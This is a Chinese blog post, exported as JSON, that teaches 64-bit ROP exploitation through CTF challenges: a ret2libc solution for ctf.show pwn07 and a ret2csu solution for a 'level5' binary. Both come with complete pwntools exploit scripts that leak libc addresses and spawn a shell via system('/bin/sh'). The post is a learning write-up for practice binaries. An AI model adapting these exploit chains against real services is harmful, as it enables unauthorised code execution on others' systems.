{"title":"ROP-x64","uid":"2d83114abbe0d2e1d7c9af7e01c50ee1","slug":"ROP-x64","date":"2021-10-18T03:29:10.000Z","updated":"2021-10-18T03:31:59.023Z","comments":true,"path":"api/articles/ROP-x64.json","keywords":null,"cover":[],"content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>之前在前面写了一篇介绍ROP的，不过是32位的，因为64位和32位多多少少有不同点，所以这次就介绍64位下的ROP</p></blockquote>\n<h1 id=\"pwn07\"><a href=\"#pwn07\" class=\"headerlink\" title=\"pwn07\"></a><a href=\"https://ctf.show/files/c4d406012dcbf2b25fd23b6a48bf2b12/pwn?token=eyJ1c2VyX2lkIjo0MjMyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjo5NX0.YWwLmA.og84JNMuW7w7Z0oZIr90NIxImf4\">pwn07</a></h1><p>做法和之前32位的ret2libc3思路是一致的，泄露puts函数地址找到libc计算出system函数地址从而获取shell。64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：</p>\n<p>泄露puts函数需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure>\n\n<p>在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(ret_addr)目的用于堆栈对齐，不然后面会报错。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28138</span>)</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006e3</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x004006E4</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\x0a&#x27;</span>)</span><br><span class=\"line\">libc_puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)</span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(<span class=\"number\">0x00000000004004c6</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ret2csu\"><a href=\"#ret2csu\" class=\"headerlink\" title=\"ret2csu\"></a>ret2csu</h1><p>由于程序没有调用puts函数，我们不能通过puts函数泄露函数地址得到libc。所以，这次我们利用一个万能gadgets来泄露函数地址获得libc，这个gadgets在__ libc_csu_init函数里面，而这个  __libc_csu_init函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。<img src=\"https://i.loli.net/2021/10/17/tcU5L9SvaAFTsMB.png\" alt=\"屏幕截图 2021-10-17 200528.png\"></p>\n<p>通过objdump -M intel -d level5命令来查看反汇编，将其中一部分指令划分为gadgets1和gadgets2，其中gadgets1作用是将栈里面的值传给寄存器，而gadgets2作用是将一些寄存器的赋给另一些寄存器。</p>\n<p>接下来就是利用这个gadgets来获取shell</p>\n<ul>\n<li>利用栈溢出执行 libc_csu_gadgets 组装好 write 函数并泄露write函数地址，并使得程序重新执行 main 函数</li>\n<li>根据 libcsearcher 获取对应 libc 版本以及system函数地址</li>\n<li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入system 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li>\n<li>再次利用栈溢出执行 libc_csu_gadgets 执行system(‘/bin/sh’) 获取 shell。</li>\n</ul>\n<p><img src=\"https://i.loli.net/2021/10/17/W9hdYOlz2JkwnSK.png\" alt=\"image.png\"></p>\n<p>下图展示了如何利用万能gadgets的流程：</p>\n<p><img src=\"https://i.loli.net/2021/10/18/IiotnxPjeKg72OS.png\" alt=\"image.png\"></p>\n<h2 id=\"第一次发送payload：\"><a href=\"#第一次发送payload：\" class=\"headerlink\" title=\"第一次发送payload：\"></a>第一次发送payload：</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x80</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(gadgets1)+p64(<span class=\"number\">0x400606</span>)+p64(<span class=\"number\">0</span>) +p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(got_write) + p64(<span class=\"number\">1</span>) + p64(got_write) + p64(<span class=\"number\">8</span>) + p64(<span class=\"number\">0x4005F0</span>) + <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span> + p64(main_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(0x400606)：是gadgets1的地址</p>\n<p>p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write)+ p64(8) ：对应的寄存器为rbx,rbp,r12,r13,r14,r15</p>\n<p><strong>rbx存入0是因为gadgets2中rbx会加1再与rbp比较，如果不同就会跳转，不能继续按我们的要求执行，所以必须保证rbx加1以后要和rbp的值一样，所以后面的rbp填入1；p64(gadgets1)将会填入r12，因为gadgets2会跳转到r12+rbx * 8的位置，因为rbx为0所以就是跳转到r12的位置； p64(1) + p64(got_write) + p64(8)将会填入r13,r14,r15寄存器，再gadgets2中会转移到edi,rsi,rdx中，也就是用于传参的前三个寄存器；p64(got_write) + p64(1) + p64(got_write)+ p64(8)最后组装成write(1,address,8)泄露write函数地址</strong></p>\n<p>p64(0x4005F0)：是gadgets2的地址</p>\n<p>“a”*56+p64(main_addr) ：因为gadgets2后面是gadgets1，gadgets1会弹出栈里面的值，为了不让gadgets1影响后面操作，就填入无用字符串，最后跳转会main函数</p>\n<p><img src=\"https://i.loli.net/2021/10/18/4fbryJxcqLZoTlH.png\" alt=\"image.png\"></p>\n<h2 id=\"第二次发送payload：\"><a href=\"#第二次发送payload：\" class=\"headerlink\" title=\"第二次发送payload：\"></a>第二次发送payload：</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 =  <span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">136</span>+p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(got_read) + p64(<span class=\"number\">0</span>) + p64(bss_addr) + p64(<span class=\"number\">16</span>)+p64(<span class=\"number\">0x4005F0</span>)+<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span>+p64(main)</span><br></pre></td></tr></table></figure>\n\n<p> p64(got_read) + p64(0) + p64(bss_addr) + p64(16)：组装成read(0,bss_addr,16)，作用是向bss段写入16字节的东西</p>\n<p><img src=\"https://i.loli.net/2021/10/18/SfaDY9HqAkTUGrd.png\" alt=\"image.png\"></p>\n<h2 id=\"第三次发送payload\"><a href=\"#第三次发送payload\" class=\"headerlink\" title=\"第三次发送payload\"></a>第三次发送payload</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload3 =  <span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">136</span> + p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) +p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(bss_addr) + p64(bss_addr+<span class=\"number\">8</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x4005F0</span>) + <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span> + p64(main_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(bss_addr) + p64(bss_addr+8)+ p64(0) + p64(0)：组装成system(“bin/sh”)，因为只有一个参数所以后面两个填零不会造成什么影响</p>\n<p><img src=\"https://i.loli.net/2021/10/18/WrZCcJ9djxq6feP.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;level5&#x27;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./level5&#x27;</span>)</span><br><span class=\"line\">got_write = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">got_read = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">start = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]  </span><br><span class=\"line\">payload1 =  <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">136</span></span><br><span class=\"line\">payload1 += p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) +p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(got_write) + p64(<span class=\"number\">1</span>) + p64(got_write) + p64(<span class=\"number\">8</span>) </span><br><span class=\"line\">payload1 += p64(<span class=\"number\">0x4005F0</span>) </span><br><span class=\"line\">payload1 += <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span></span><br><span class=\"line\">payload1 += p64(start)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Hello, World\\n&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;\\n#############sending payload1#############\\n&quot;</span></span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libcbase = write_addr-libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;system_address:&#x27;</span>,system_addr</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;libcbase:&#x27;</span>,libcbase</span><br><span class=\"line\">bss_addr=<span class=\"number\">0x601028</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Hello, World\\n&quot;</span>)</span><br><span class=\"line\">payload2 =  <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">136</span></span><br><span class=\"line\">payload2 += p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(got_read) + p64(<span class=\"number\">0</span>) + p64(bss_addr) + p64(<span class=\"number\">16</span>) </span><br><span class=\"line\">payload2 += p64(<span class=\"number\">0x4005F0</span>) </span><br><span class=\"line\">payload2 += <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span></span><br><span class=\"line\">payload2 += p64(start)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;\\n#############sending payload2#############\\n&quot;</span></span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\">p.send(p64(system_addr))</span><br><span class=\"line\">p.send(<span class=\"string\">&quot;/bin/sh\\0&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Hello, World\\n&quot;</span>)</span><br><span class=\"line\">payload3 =  <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">136</span></span><br><span class=\"line\">payload3 += p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) +p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(bss_addr) + p64(bss_addr+<span class=\"number\">8</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) </span><br><span class=\"line\">payload3 += p64(<span class=\"number\">0x4005F0</span>) </span><br><span class=\"line\">payload3 += <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span></span><br><span class=\"line\">payload3 += p64(start)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;\\n#############sending payload3#############\\n&quot;</span></span><br><span class=\"line\">p.send(payload3)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/18/osBbMZqYGX8e41x.png\" alt=\"image.png\"></p>\n","feature":true,"text":" 之前在前面写了一篇介绍ROP的，不过是32位的，因为64位和32位多多少少有不同点，所以这次就介绍64位下的ROP pwn07做法和之前32位的ret2libc3思路是一致的，泄露puts函数地址找到libc计算出system函数地址从而获取shell。64位是通过寄存器传递参...","link":"","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":2,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn07\"><span class=\"toc-text\">pwn07</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2csu\"><span class=\"toc-text\">ret2csu</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%91%E9%80%81payload%EF%BC%9A\"><span class=\"toc-text\">第一次发送payload：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%91%E9%80%81payload%EF%BC%9A\"><span class=\"toc-text\">第二次发送payload：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%8F%91%E9%80%81payload\"><span class=\"toc-text\">第三次发送payload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"绕过canary的方法","uid":"d80adffe0e6ac7d06b461539fbc0ad33","slug":"绕过canary的方法","date":"2021-10-25T12:49:23.000Z","updated":"2021-10-26T00:45:52.967Z","comments":true,"path":"api/articles/绕过canary的方法.json","keywords":null,"cover":[],"text":"泄露地址绕过这种方法对应特定类型的题目，题目中会有两个输入，至少一个输出。通过第一次输入泄露出canary，第二次利用泄露的canary来绕过，从而实现栈溢出 stackguard1一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"pwn","slug":"pwn","count":1,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":1,"path":"api/tags/笔记.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"延迟绑定","uid":"a4072082096b626cb339c7cf12b546b7","slug":"plt、got和延迟绑定","date":"2021-10-17T02:26:57.000Z","updated":"2021-10-21T11:34:25.880Z","comments":true,"path":"api/articles/plt、got和延迟绑定.json","keywords":null,"cover":[],"text":"程序运行时，printf的地址就会被存储到data段，call c &lt;hello+0xc&gt;就会跳转到call printf_stub 123printf_stub: mov rax,[printf函数地址] jmp rax 程序在编译的时候会采用两种表进行辅助，即pl...","link":"","photos":[],"count_time":{"symbolsCount":"1.3k","symbolsTime":"1 mins."},"categories":[{"name":"心得","slug":"心得","count":3,"path":"api/categories/心得.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}